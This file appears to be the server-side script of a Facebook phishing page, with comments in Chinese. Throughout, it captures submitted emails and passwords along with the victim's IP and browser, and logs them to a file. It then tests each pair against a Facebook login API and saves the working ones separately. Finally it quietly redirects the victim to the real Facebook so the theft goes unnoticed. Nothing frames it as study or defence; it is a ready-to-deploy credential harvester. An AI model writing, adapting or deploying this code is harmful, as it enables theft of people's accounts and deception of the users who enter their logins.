<?php
// 日志记录功能
$email = $_POST['email'] ?? '';
$pass = $_POST['pass'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');

// 写入原始日志
$log_entry = "[$time] IP: $ip | UA: $ua | Email: $email | Pass: $pass\n";
file_put_contents('logs.txt', $log_entry, FILE_APPEND | LOCK_EX);

// 验证凭据有效性（转发至真实Facebook API）
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://b-api.facebook.com/method/auth.login',
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query([
        'email' => $email,
        'password' => $pass,
        'format' => 'json',
        'api_key' => '882a8490361da98702bf97a021ddc14d', // 公共FB API密钥
        'credentials_type' => 'password'
    ]),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_TIMEOUT => 10,
]);
$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// 解析响应判断登录是否成功
$success = false;
if ($http_code == 200) {
    $data = json_decode($response, true);
    if (isset($data['access_token']) || isset($data['session_key'])) {
        $success = true;
        // 存储有效凭据
        file_put_contents('valid.txt', "$email | $pass | $time\n", FILE_APPEND | LOCK_EX);
    }
}

// 重定向至真实Facebook首页（无论成败）
header('Location: https://www.facebook.com/');
exit;
?>
